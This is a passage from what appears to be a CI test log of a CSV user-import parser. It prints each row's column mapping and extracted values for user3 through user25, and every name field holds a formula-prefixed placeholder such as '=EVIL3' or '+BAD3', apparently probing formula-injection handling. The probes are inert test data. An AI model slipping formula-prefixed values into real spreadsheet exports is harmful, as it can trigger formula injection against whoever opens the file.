2025-11-18T17:36:03.4928250Z   lastName: [32m'+BAD2'[39m,
2025-11-18T17:36:03.4928742Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4929288Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4929671Z }
2025-11-18T17:36:03.4930001Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4930507Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4931474Z   cellValues: [ [32m'user3@example.com'[39m, [32m'=EVIL3'[39m, [32m'+BAD3'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4932218Z   columnMapping: {
2025-11-18T17:36:03.4932680Z     email: [33m0[39m,
2025-11-18T17:36:03.4933121Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4933599Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4934038Z     role: [33m3[39m,
2025-11-18T17:36:03.4934456Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4934901Z     password: [33m-1[39m
2025-11-18T17:36:03.4935264Z   }
2025-11-18T17:36:03.4935537Z }
2025-11-18T17:36:03.4935940Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4936544Z   email: [32m'user3@example.com'[39m,
2025-11-18T17:36:03.4937582Z   firstName: [32m'=EVIL3'[39m,
2025-11-18T17:36:03.4938158Z   lastName: [32m'+BAD3'[39m,
2025-11-18T17:36:03.4938666Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4939200Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4939619Z }
2025-11-18T17:36:03.4939984Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4940495Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4941439Z   cellValues: [ [32m'user4@example.com'[39m, [32m'=EVIL4'[39m, [32m'+BAD4'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4942411Z   columnMapping: {
2025-11-18T17:36:03.4942842Z     email: [33m0[39m,
2025-11-18T17:36:03.4943262Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4944119Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4944605Z     role: [33m3[39m,
2025-11-18T17:36:03.4945006Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4945431Z     password: [33m-1[39m
2025-11-18T17:36:03.4945787Z   }
2025-11-18T17:36:03.4946055Z }
2025-11-18T17:36:03.4946452Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4947249Z   email: [32m'user4@example.com'[39m,
2025-11-18T17:36:03.4947852Z   firstName: [32m'=EVIL4'[39m,
2025-11-18T17:36:03.4948419Z   lastName: [32m'+BAD4'[39m,
2025-11-18T17:36:03.4948912Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4949446Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4949848Z }
2025-11-18T17:36:03.4950191Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4950693Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4951609Z   cellValues: [ [32m'user5@example.com'[39m, [32m'=EVIL5'[39m, [32m'+BAD5'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4952308Z   columnMapping: {
2025-11-18T17:36:03.4952710Z     email: [33m0[39m,
2025-11-18T17:36:03.4953105Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4953499Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4953894Z     role: [33m3[39m,
2025-11-18T17:36:03.4954261Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4954867Z     password: [33m-1[39m
2025-11-18T17:36:03.4955221Z   }
2025-11-18T17:36:03.4955469Z }
2025-11-18T17:36:03.4955831Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4956357Z   email: [32m'user5@example.com'[39m,
2025-11-18T17:36:03.4957194Z   firstName: [32m'=EVIL5'[39m,
2025-11-18T17:36:03.4957702Z   lastName: [32m'+BAD5'[39m,
2025-11-18T17:36:03.4958140Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4958633Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4958999Z }
2025-11-18T17:36:03.4959318Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4959756Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4960650Z   cellValues: [ [32m'user6@example.com'[39m, [32m'=EVIL6'[39m, [32m'+BAD6'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4961349Z   columnMapping: {
2025-11-18T17:36:03.4961733Z     email: [33m0[39m,
2025-11-18T17:36:03.4962130Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4962530Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4962939Z     role: [33m3[39m,
2025-11-18T17:36:03.4963326Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4963715Z     password: [33m-1[39m
2025-11-18T17:36:03.4964043Z   }
2025-11-18T17:36:03.4964301Z }
2025-11-18T17:36:03.4964972Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4965608Z   email: [32m'user6@example.com'[39m,
2025-11-18T17:36:03.4966180Z   firstName: [32m'=EVIL6'[39m,
2025-11-18T17:36:03.4966714Z   lastName: [32m'+BAD6'[39m,
2025-11-18T17:36:03.4967390Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4967912Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4968297Z }
2025-11-18T17:36:03.4968635Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4969128Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4970086Z   cellValues: [ [32m'user7@example.com'[39m, [32m'=EVIL7'[39m, [32m'+BAD7'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4970808Z   columnMapping: {
2025-11-18T17:36:03.4971238Z     email: [33m0[39m,
2025-11-18T17:36:03.4971668Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4972108Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4972503Z     role: [33m3[39m,
2025-11-18T17:36:03.4972889Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4973292Z     password: [33m-1[39m
2025-11-18T17:36:03.4973639Z   }
2025-11-18T17:36:03.4973895Z }
2025-11-18T17:36:03.4974275Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4974942Z   email: [32m'user7@example.com'[39m,
2025-11-18T17:36:03.4975554Z   firstName: [32m'=EVIL7'[39m,
2025-11-18T17:36:03.4976107Z   lastName: [32m'+BAD7'[39m,
2025-11-18T17:36:03.4976582Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4977796Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4978194Z }
2025-11-18T17:36:03.4978526Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4978979Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4979903Z   cellValues: [ [32m'user8@example.com'[39m, [32m'=EVIL8'[39m, [32m'+BAD8'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4980624Z   columnMapping: {
2025-11-18T17:36:03.4981041Z     email: [33m0[39m,
2025-11-18T17:36:03.4981462Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4981886Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4982285Z     role: [33m3[39m,
2025-11-18T17:36:03.4982660Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4983164Z     password: [33m-1[39m
2025-11-18T17:36:03.4983527Z   }
2025-11-18T17:36:03.4983785Z }
2025-11-18T17:36:03.4984150Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4984685Z   email: [32m'user8@example.com'[39m,
2025-11-18T17:36:03.4985229Z   firstName: [32m'=EVIL8'[39m,
2025-11-18T17:36:03.4985733Z   lastName: [32m'+BAD8'[39m,
2025-11-18T17:36:03.4986192Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4986671Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4987250Z }
2025-11-18T17:36:03.4987579Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4988038Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4988944Z   cellValues: [ [32m'user9@example.com'[39m, [32m'=EVIL9'[39m, [32m'+BAD9'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4989698Z   columnMapping: {
2025-11-18T17:36:03.4990381Z     email: [33m0[39m,
2025-11-18T17:36:03.4990880Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4991373Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4991827Z     role: [33m3[39m,
2025-11-18T17:36:03.4992239Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4992655Z     password: [33m-1[39m
2025-11-18T17:36:03.4993006Z   }
2025-11-18T17:36:03.4993275Z }
2025-11-18T17:36:03.4993660Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4994236Z   email: [32m'user9@example.com'[39m,
2025-11-18T17:36:03.4994774Z   firstName: [32m'=EVIL9'[39m,
2025-11-18T17:36:03.4995269Z   lastName: [32m'+BAD9'[39m,
2025-11-18T17:36:03.4995709Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4996195Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4996580Z }
2025-11-18T17:36:03.4997224Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4997729Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4998782Z   cellValues: [ [32m'user10@example.com'[39m, [32m'=EVIL10'[39m, [32m'+BAD10'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4999550Z   columnMapping: {
2025-11-18T17:36:03.4999999Z     email: [33m0[39m,
2025-11-18T17:36:03.5000471Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5000949Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5001399Z     role: [33m3[39m,
2025-11-18T17:36:03.5001822Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5002273Z     password: [33m-1[39m
2025-11-18T17:36:03.5002649Z   }
2025-11-18T17:36:03.5002934Z }
2025-11-18T17:36:03.5003320Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5003933Z   email: [32m'user10@example.com'[39m,
2025-11-18T17:36:03.5004540Z   firstName: [32m'=EVIL10'[39m,
2025-11-18T17:36:03.5005073Z   lastName: [32m'+BAD10'[39m,
2025-11-18T17:36:03.5005567Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5006057Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5006445Z }
2025-11-18T17:36:03.5006978Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5007493Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5008488Z   cellValues: [ [32m'user11@example.com'[39m, [32m'=EVIL11'[39m, [32m'+BAD11'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5009253Z   columnMapping: {
2025-11-18T17:36:03.5009689Z     email: [33m0[39m,
2025-11-18T17:36:03.5010138Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5010613Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5011072Z     role: [33m3[39m,
2025-11-18T17:36:03.5011500Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5011960Z     password: [33m-1[39m
2025-11-18T17:36:03.5012323Z   }
2025-11-18T17:36:03.5012597Z }
2025-11-18T17:36:03.5012985Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5013868Z   email: [32m'user11@example.com'[39m,
2025-11-18T17:36:03.5014454Z   firstName: [32m'=EVIL11'[39m,
2025-11-18T17:36:03.5015005Z   lastName: [32m'+BAD11'[39m,
2025-11-18T17:36:03.5015495Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5016032Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5016425Z }
2025-11-18T17:36:03.5016960Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5017472Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5018470Z   cellValues: [ [32m'user12@example.com'[39m, [32m'=EVIL12'[39m, [32m'+BAD12'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5019233Z   columnMapping: {
2025-11-18T17:36:03.5019664Z     email: [33m0[39m,
2025-11-18T17:36:03.5020091Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5020548Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5021007Z     role: [33m3[39m,
2025-11-18T17:36:03.5021432Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5021884Z     password: [33m-1[39m
2025-11-18T17:36:03.5022251Z   }
2025-11-18T17:36:03.5022543Z }
2025-11-18T17:36:03.5022941Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5023572Z   email: [32m'user12@example.com'[39m,
2025-11-18T17:36:03.5024183Z   firstName: [32m'=EVIL12'[39m,
2025-11-18T17:36:03.5024735Z   lastName: [32m'+BAD12'[39m,
2025-11-18T17:36:03.5025147Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5025589Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5025921Z }
2025-11-18T17:36:03.5026416Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5027003Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5027841Z   cellValues: [ [32m'user13@example.com'[39m, [32m'=EVIL13'[39m, [32m'+BAD13'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5028484Z   columnMapping: {
2025-11-18T17:36:03.5028826Z     email: [33m0[39m,
2025-11-18T17:36:03.5029174Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5029544Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5029901Z     role: [33m3[39m,
2025-11-18T17:36:03.5030235Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5030597Z     password: [33m-1[39m
2025-11-18T17:36:03.5030897Z   }
2025-11-18T17:36:03.5031124Z }
2025-11-18T17:36:03.5031450Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5031928Z   email: [32m'user13@example.com'[39m,
2025-11-18T17:36:03.5032409Z   firstName: [32m'=EVIL13'[39m,
2025-11-18T17:36:03.5032844Z   lastName: [32m'+BAD13'[39m,
2025-11-18T17:36:03.5033236Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5033660Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5033971Z }
2025-11-18T17:36:03.5034251Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5034633Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5035439Z   cellValues: [ [32m'user14@example.com'[39m, [32m'=EVIL14'[39m, [32m'+BAD14'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5036061Z   columnMapping: {
2025-11-18T17:36:03.5036398Z     email: [33m0[39m,
2025-11-18T17:36:03.5036745Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5037263Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5037612Z     role: [33m3[39m,
2025-11-18T17:36:03.5037952Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5038296Z     password: [33m-1[39m
2025-11-18T17:36:03.5038595Z   }
2025-11-18T17:36:03.5038842Z }
2025-11-18T17:36:03.5039232Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5039839Z   email: [32m'user14@example.com'[39m,
2025-11-18T17:36:03.5040513Z   firstName: [32m'=EVIL14'[39m,
2025-11-18T17:36:03.5041023Z   lastName: [32m'+BAD14'[39m,
2025-11-18T17:36:03.5041499Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5042016Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5042411Z }
2025-11-18T17:36:03.5042752Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5043251Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5062817Z   cellValues: [ [32m'user15@example.com'[39m, [32m'=EVIL15'[39m, [32m'+BAD15'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5063680Z   columnMapping: {
2025-11-18T17:36:03.5064158Z     email: [33m0[39m,
2025-11-18T17:36:03.5064591Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5065039Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5065812Z     role: [33m3[39m,
2025-11-18T17:36:03.5066281Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5067739Z     password: [33m-1[39m
2025-11-18T17:36:03.5068159Z   }
2025-11-18T17:36:03.5068452Z }
2025-11-18T17:36:03.5068872Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5069534Z   email: [32m'user15@example.com'[39m,
2025-11-18T17:36:03.5070142Z   firstName: [32m'=EVIL15'[39m,
2025-11-18T17:36:03.5070728Z   lastName: [32m'+BAD15'[39m,
2025-11-18T17:36:03.5071227Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5071722Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5072091Z }
2025-11-18T17:36:03.5072424Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5072876Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5073840Z   cellValues: [ [32m'user16@example.com'[39m, [32m'=EVIL16'[39m, [32m'+BAD16'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5074577Z   columnMapping: {
2025-11-18T17:36:03.5074994Z     email: [33m0[39m,
2025-11-18T17:36:03.5075496Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5075970Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5076388Z     role: [33m3[39m,
2025-11-18T17:36:03.5077027Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5077496Z     password: [33m-1[39m
2025-11-18T17:36:03.5077879Z   }
2025-11-18T17:36:03.5078151Z }
2025-11-18T17:36:03.5078552Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5079505Z   email: [32m'user16@example.com'[39m,
2025-11-18T17:36:03.5080170Z   firstName: [32m'=EVIL16'[39m,
2025-11-18T17:36:03.5080727Z   lastName: [32m'+BAD16'[39m,
2025-11-18T17:36:03.5081215Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5081726Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5082112Z }
2025-11-18T17:36:03.5082464Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5082945Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5083911Z   cellValues: [ [32m'user17@example.com'[39m, [32m'=EVIL17'[39m, [32m'+BAD17'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5084704Z   columnMapping: {
2025-11-18T17:36:03.5085177Z     email: [33m0[39m,
2025-11-18T17:36:03.5085608Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5086073Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5086523Z     role: [33m3[39m,
2025-11-18T17:36:03.5087297Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5087751Z     password: [33m-1[39m
2025-11-18T17:36:03.5088121Z   }
2025-11-18T17:36:03.5088404Z }
2025-11-18T17:36:03.5088825Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5089444Z   email: [32m'user17@example.com'[39m,
2025-11-18T17:36:03.5090067Z   firstName: [32m'=EVIL17'[39m,
2025-11-18T17:36:03.5090632Z   lastName: [32m'+BAD17'[39m,
2025-11-18T17:36:03.5091132Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5091661Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5092048Z }
2025-11-18T17:36:03.5092383Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5092873Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5093876Z   cellValues: [ [32m'user18@example.com'[39m, [32m'=EVIL18'[39m, [32m'+BAD18'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5094666Z   columnMapping: {
2025-11-18T17:36:03.5095121Z     email: [33m0[39m,
2025-11-18T17:36:03.5095566Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5096024Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5096457Z     role: [33m3[39m,
2025-11-18T17:36:03.5097101Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5097541Z     password: [33m-1[39m
2025-11-18T17:36:03.5097912Z   }
2025-11-18T17:36:03.5098277Z }
2025-11-18T17:36:03.5098684Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5099310Z   email: [32m'user18@example.com'[39m,
2025-11-18T17:36:03.5099921Z   firstName: [32m'=EVIL18'[39m,
2025-11-18T17:36:03.5100468Z   lastName: [32m'+BAD18'[39m,
2025-11-18T17:36:03.5100961Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5101477Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5101866Z }
2025-11-18T17:36:03.5102214Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5102725Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5103725Z   cellValues: [ [32m'user19@example.com'[39m, [32m'=EVIL19'[39m, [32m'+BAD19'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5104750Z   columnMapping: {
2025-11-18T17:36:03.5105225Z     email: [33m0[39m,
2025-11-18T17:36:03.5105680Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5106142Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5106589Z     role: [33m3[39m,
2025-11-18T17:36:03.5107211Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5107667Z     password: [33m-1[39m
2025-11-18T17:36:03.5108009Z   }
2025-11-18T17:36:03.5108267Z }
2025-11-18T17:36:03.5108641Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5109214Z   email: [32m'user19@example.com'[39m,
2025-11-18T17:36:03.5109759Z   firstName: [32m'=EVIL19'[39m,
2025-11-18T17:36:03.5110260Z   lastName: [32m'+BAD19'[39m,
2025-11-18T17:36:03.5110707Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5111197Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5111559Z }
2025-11-18T17:36:03.5111896Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5112378Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5113338Z   cellValues: [ [32m'user20@example.com'[39m, [32m'=EVIL20'[39m, [32m'+BAD20'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5114097Z   columnMapping: {
2025-11-18T17:36:03.5114509Z     email: [33m0[39m,
2025-11-18T17:36:03.5114938Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5115387Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5115801Z     role: [33m3[39m,
2025-11-18T17:36:03.5116400Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5117043Z     password: [33m-1[39m
2025-11-18T17:36:03.5117420Z   }
2025-11-18T17:36:03.5117694Z }
2025-11-18T17:36:03.5118061Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5118633Z   email: [32m'user20@example.com'[39m,
2025-11-18T17:36:03.5119192Z   firstName: [32m'=EVIL20'[39m,
2025-11-18T17:36:03.5119697Z   lastName: [32m'+BAD20'[39m,
2025-11-18T17:36:03.5120132Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5120611Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5120980Z }
2025-11-18T17:36:03.5121332Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5121845Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5122814Z   cellValues: [ [32m'user21@example.com'[39m, [32m'=EVIL21'[39m, [32m'+BAD21'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5123570Z   columnMapping: {
2025-11-18T17:36:03.5123990Z     email: [33m0[39m,
2025-11-18T17:36:03.5124413Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5124887Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5125345Z     role: [33m3[39m,
2025-11-18T17:36:03.5125758Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5126187Z     password: [33m-1[39m
2025-11-18T17:36:03.5126534Z   }
2025-11-18T17:36:03.5127115Z }
2025-11-18T17:36:03.5127530Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5128218Z   email: [32m'user21@example.com'[39m,
2025-11-18T17:36:03.5128810Z   firstName: [32m'=EVIL21'[39m,
2025-11-18T17:36:03.5129371Z   lastName: [32m'+BAD21'[39m,
2025-11-18T17:36:03.5129872Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5130398Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5130778Z }
2025-11-18T17:36:03.5131124Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5131633Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5132640Z   cellValues: [ [32m'user22@example.com'[39m, [32m'=EVIL22'[39m, [32m'+BAD22'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5133430Z   columnMapping: {
2025-11-18T17:36:03.5133891Z     email: [33m0[39m,
2025-11-18T17:36:03.5134350Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5134800Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5135224Z     role: [33m3[39m,
2025-11-18T17:36:03.5135637Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5136093Z     password: [33m-1[39m
2025-11-18T17:36:03.5136456Z   }
2025-11-18T17:36:03.5136714Z }
2025-11-18T17:36:03.5137325Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5137951Z   email: [32m'user22@example.com'[39m,
2025-11-18T17:36:03.5138569Z   firstName: [32m'=EVIL22'[39m,
2025-11-18T17:36:03.5139111Z   lastName: [32m'+BAD22'[39m,
2025-11-18T17:36:03.5139889Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5140445Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5140844Z }
2025-11-18T17:36:03.5141178Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5141662Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5142890Z   cellValues: [ [32m'user23@example.com'[39m, [32m'=EVIL23'[39m, [32m'+BAD23'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5143688Z   columnMapping: {
2025-11-18T17:36:03.5144167Z     email: [33m0[39m,
2025-11-18T17:36:03.5144622Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5145092Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5145626Z     role: [33m3[39m,
2025-11-18T17:36:03.5146061Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5146512Z     password: [33m-1[39m
2025-11-18T17:36:03.5147171Z   }
2025-11-18T17:36:03.5147473Z }
2025-11-18T17:36:03.5147885Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5148526Z   email: [32m'user23@example.com'[39m,
2025-11-18T17:36:03.5149139Z   firstName: [32m'=EVIL23'[39m,
2025-11-18T17:36:03.5149683Z   lastName: [32m'+BAD23'[39m,
2025-11-18T17:36:03.5150153Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5150627Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5151002Z }
2025-11-18T17:36:03.5151332Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5151775Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5152890Z   cellValues: [ [32m'user24@example.com'[39m, [32m'=EVIL24'[39m, [32m'+BAD24'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5153638Z   columnMapping: {
2025-11-18T17:36:03.5154038Z     email: [33m0[39m,
2025-11-18T17:36:03.5154461Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5154928Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5155372Z     role: [33m3[39m,
2025-11-18T17:36:03.5155793Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5156218Z     password: [33m-1[39m
2025-11-18T17:36:03.5156587Z   }
2025-11-18T17:36:03.5157178Z }
2025-11-18T17:36:03.5157598Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5158234Z   email: [32m'user24@example.com'[39m,
2025-11-18T17:36:03.5158841Z   firstName: [32m'=EVIL24'[39m,
2025-11-18T17:36:03.5159372Z   lastName: [32m'+BAD24'[39m,
2025-11-18T17:36:03.5159836Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5160336Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5160701Z }
2025-11-18T17:36:03.5161033Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5161537Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5162567Z   cellValues: [ [32m'user25@example.com'[39m, [32m'=EVIL25'[39m, [32m'+BAD25'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5163347Z   columnMapping: {
2025-11-18T17:36:03.5163785Z     email: [33m0[39m,
2025-11-18T17:36:03.5164215Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5164672Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5165103Z     role: [33m3[39m,
2025-11-18T17:36:03.5165518Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5165946Z     password: [33m-1[39m
2025-11-18T17:36:03.5166318Z   }
2025-11-18T17:36:03.5166593Z }
2025-11-18T17:36:03.5167207Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5167848Z   email: [32m'user25@example.com'[39m,
2025-11-18T17:36:03.5168434Z   firstName: [32m'=EVIL25'[39m,
2025-11-18T17:36:03.5168996Z   lastName: [32m'+BAD25'[39m,
2025-11-18T17:36:03.5169468Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5169989Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5170366Z }
2025-11-18T17:36:03.5170708Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5171213Z   totalCells: [33m4[39m,
